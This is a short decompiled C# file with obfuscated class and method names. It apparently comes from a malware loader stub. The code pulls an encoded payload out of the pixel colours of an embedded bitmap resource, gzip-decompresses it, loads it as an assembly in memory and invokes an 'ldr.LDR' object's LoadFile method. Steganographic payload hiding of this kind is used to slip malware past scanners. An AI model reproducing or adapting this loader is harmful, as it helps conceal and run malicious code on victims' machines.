using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal class Class1
{
	static byte[] smethod_0(string string_0)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		return Class1.smethod_2((Bitmap)Class0.resourceManager_0.GetObject(string_0));
	}

	static void smethod_1(object object_0)
	{
		object_0.GetType().InvokeMember("LoadFile", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(object_0), new object[4]
		{
			Assembly.GetExecutingAssembly(),
			"SEIiWTNfczVtzvI",
			"bdxafsDYlZLmJI",
			"cYNhYOcmVVIuWsFTB"
		});
	}

	static byte[] smethod_2(Bitmap bitmap_0)
	{
		List<byte> list = new List<byte>();
		checked
		{
			int num = ((Image)bitmap_0).get_Width() - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)bitmap_0).get_Height() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = bitmap_0.GetPixel(i, j);
					if (pixel != Color.FromArgb(0, 0, 0, 0))
					{
						list.Add(pixel.R);
						list.Add(pixel.G);
						list.Add(pixel.B);
					}
				}
			}
			return Class1.smethod_4(list.ToArray());
		}
	}

	static object smethod_3(byte[] byte_0)
	{
		return Assembly.Load(byte_0).CreateInstance("ldr.LDR");
	}

	static byte[] smethod_4(byte[] byte_0)
	{
		checked
		{
			using MemoryStream memoryStream = new MemoryStream(byte_0);
			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
			{
				int num = 0;
				int num2;
				do
				{
					byte_0 = (byte[])Utils.CopyArray((Array)byte_0, (Array)new byte[num + 1024 - 1 + 1]);
					num2 = gZipStream.Read(byte_0, num, 1024);
					num += num2;
				}
				while (num2 >= 1024);
				byte_0 = (byte[])Utils.CopyArray((Array)byte_0, (Array)new byte[num - 1 + 1]);
				gZipStream.Close();
			}
			memoryStream.Close();
			return byte_0;
		}
	}
}
